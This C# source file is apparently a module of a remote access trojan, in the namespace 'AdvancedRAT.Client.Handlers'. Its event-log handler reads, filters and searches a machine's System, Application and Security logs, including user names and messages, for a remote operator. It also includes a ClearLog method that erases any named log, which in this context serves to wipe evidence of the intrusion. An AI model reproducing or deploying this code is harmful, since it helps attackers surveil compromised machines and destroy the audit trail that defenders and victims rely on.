using System;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;

namespace AdvancedRAT.Client.Handlers
{
    public class EventLogHandler
    {
        public async Task<object> GetSystemLogs(int maxEntries = 100)
        {
            return await GetEventLogs("System", maxEntries);
        }
        
        public async Task<object> GetApplicationLogs(int maxEntries = 100)
        {
            return await GetEventLogs("Application", maxEntries);
        }
        
        public async Task<object> GetSecurityLogs(int maxEntries = 100)
        {
            return await GetEventLogs("Security", maxEntries);
        }
        
        public async Task<object> GetFilteredLogs(string logName, string level = null, string source = null, DateTime? fromDate = null, DateTime? toDate = null, int maxEntries = 100)
        {
            try
            {
                var logs = new List<Dictionary<string, string>>();
                
                using (var eventLog = new EventLog(logName))
                {
                    var entries = eventLog.Entries.Cast<EventLogEntry>()
                        .OrderByDescending(e => e.TimeGenerated)
                        .Take(maxEntries * 10); // 필터링 전 더 많이 가져오기
                    
                    foreach (var entry in entries)
                    {
                        // 날짜 필터
                        if (fromDate.HasValue && entry.TimeGenerated < fromDate.Value)
                            continue;
                        if (toDate.HasValue && entry.TimeGenerated > toDate.Value)
                            continue;
                        
                        // 레벨 필터
                        if (!string.IsNullOrEmpty(level))
                        {
                            var entryLevel = entry.EntryType.ToString();
                            if (!entryLevel.Equals(level, StringComparison.OrdinalIgnoreCase))
                                continue;
                        }
                        
                        // 소스 필터
                        if (!string.IsNullOrEmpty(source))
                        {
                            if (!entry.Source.Contains(source, StringComparison.OrdinalIgnoreCase))
                                continue;
                        }
                        
                        logs.Add(new Dictionary<string, string>
                        {
                            ["Index"] = entry.Index.ToString(),
                            ["TimeGenerated"] = entry.TimeGenerated.ToString("yyyy-MM-dd HH:mm:ss"),
                            ["EntryType"] = entry.EntryType.ToString(),
                            ["Source"] = entry.Source,
                            ["Category"] = entry.Category,
                            ["EventID"] = entry.InstanceId.ToString(),
                            ["Message"] = entry.Message?.Replace("\r\n", " ").Replace("\n", " ") ?? "",
                            ["UserName"] = entry.UserName ?? ""
                        });
                        
                        if (logs.Count >= maxEntries)
                            break;
                    }
                }
                
                return new { success = true, logName, logs, count = logs.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SearchLogs(string logName, string searchText, int maxEntries = 100)
        {
            try
            {
                var logs = new List<Dictionary<string, string>>();
                
                using (var eventLog = new EventLog(logName))
                {
                    var entries = eventLog.Entries.Cast<EventLogEntry>()
                        .OrderByDescending(e => e.TimeGenerated);
                    
                    foreach (var entry in entries)
                    {
                        // 메시지, 소스, 사용자 이름에서 검색
                        bool found = false;
                        
                        if (entry.Message != null && entry.Message.Contains(searchText, StringComparison.OrdinalIgnoreCase))
                            found = true;
                        else if (entry.Source.Contains(searchText, StringComparison.OrdinalIgnoreCase))
                            found = true;
                        else if (entry.UserName != null && entry.UserName.Contains(searchText, StringComparison.OrdinalIgnoreCase))
                            found = true;
                        
                        if (!found)
                            continue;
                        
                        logs.Add(new Dictionary<string, string>
                        {
                            ["Index"] = entry.Index.ToString(),
                            ["TimeGenerated"] = entry.TimeGenerated.ToString("yyyy-MM-dd HH:mm:ss"),
                            ["EntryType"] = entry.EntryType.ToString(),
                            ["Source"] = entry.Source,
                            ["Category"] = entry.Category,
                            ["EventID"] = entry.InstanceId.ToString(),
                            ["Message"] = entry.Message?.Replace("\r\n", " ").Replace("\n", " ") ?? "",
                            ["UserName"] = entry.UserName ?? ""
                        });
                        
                        if (logs.Count >= maxEntries)
                            break;
                    }
                }
                
                return new { success = true, logName, searchText, logs, count = logs.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetLogList()
        {
            try
            {
                var logs = EventLog.GetEventLogs()
                    .Select(log => new Dictionary<string, string>
                    {
                        ["LogName"] = log.Log,
                        ["MachineName"] = log.MachineName,
                        ["EntryCount"] = log.Entries.Count.ToString()
                    })
                    .ToList();
                
                return new { success = true, logs, count = logs.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ClearLog(string logName)
        {
            try
            {
                using (var eventLog = new EventLog(logName))
                {
                    eventLog.Clear();
                }
                
                return new { success = true, message = $"Log '{logName}' cleared successfully" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private async Task<object> GetEventLogs(string logName, int maxEntries)
        {
            try
            {
                var logs = new List<Dictionary<string, string>>();
                
                using (var eventLog = new EventLog(logName))
                {
                    var entries = eventLog.Entries.Cast<EventLogEntry>()
                        .OrderByDescending(e => e.TimeGenerated)
                        .Take(maxEntries);
                    
                    foreach (var entry in entries)
                    {
                        logs.Add(new Dictionary<string, string>
                        {
                            ["Index"] = entry.Index.ToString(),
                            ["TimeGenerated"] = entry.TimeGenerated.ToString("yyyy-MM-dd HH:mm:ss"),
                            ["EntryType"] = entry.EntryType.ToString(),
                            ["Source"] = entry.Source,
                            ["Category"] = entry.Category,
                            ["EventID"] = entry.InstanceId.ToString(),
                            ["Message"] = entry.Message?.Replace("\r\n", " ").Replace("\n", " ") ?? "",
                            ["UserName"] = entry.UserName ?? ""
                        });
                    }
                }
                
                return new { success = true, logName, logs, count = logs.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
